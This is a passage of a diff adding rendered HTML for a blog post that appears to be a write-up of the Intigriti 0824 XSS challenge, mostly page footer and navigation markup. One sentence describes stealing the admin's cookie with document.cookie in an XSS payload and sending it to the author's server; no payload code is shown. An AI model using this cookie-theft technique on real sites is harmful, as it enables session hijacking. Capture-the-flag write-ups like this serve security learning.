+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#-exploit-" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><strong>Finally It works!!</strong></p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="image"
+    src="https://hackmd.io/_uploads/BkxpOBjqR.png"
+    ></figure>
+</p>
+<p>To obtain the flag stored in the admin&rsquo;s cookie, we can simply access <strong>document.cookie</strong> within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.</p>
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+  
+  
+
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/intigriti-0824/index.md"
+          data-oid-likes="likes_posts/intigriti-0824/index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/posts/intigriti-0724/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Intigriti 0724 XSS Challenge
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2024-06-06T21:00:26&#43;05:30">2024-06</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/posts/intigriti-0125/">
+              <span class="leading-6">
+                Intigriti 0125 XSS Challenge&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-01-19T21:26:29&#43;05:30">2025-01</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
